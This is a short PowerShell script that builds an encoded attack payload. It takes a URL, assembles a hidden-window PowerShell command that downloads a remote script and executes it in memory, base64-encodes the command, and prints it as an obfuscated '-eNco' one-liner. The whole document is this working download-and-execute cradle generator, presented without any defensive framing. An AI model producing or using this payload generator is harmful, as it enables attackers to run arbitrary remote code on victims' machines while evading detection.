$cs = $args[0]
$command = "powershell.exe -nop -w hidden -c (IEX ((new-object net.webclient).downloadstring('$cs')))"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$payload = "powershell.exe -eNco "+$encodedCommand
echo $payload